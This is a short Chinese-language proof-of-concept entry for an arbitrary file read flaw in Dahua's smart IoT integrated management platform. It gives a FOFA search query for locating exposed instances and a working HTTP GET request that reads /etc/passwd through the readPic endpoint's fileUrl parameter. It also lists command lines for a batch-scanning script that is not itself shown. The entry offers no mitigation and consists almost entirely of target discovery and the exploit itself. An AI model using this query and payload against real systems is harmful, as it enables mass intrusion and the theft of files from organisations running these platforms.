# 大华智能物联综合管理平台存在env任意文件读取漏洞

### 1.漏洞描述

大华智能物联综合管理平台存在env任意文件读取漏洞，允许攻击者远程读取系统中的任意文件。

### 2.fofa语法

```plain
body="*客户端会小于800*"
```

### 3.漏洞复现

```plain
GET /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1720005763730-3e4c96a0-9cc2-456b-ab16-59d30ebb3d4d.png)

### 4.py脚本

```plain
python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```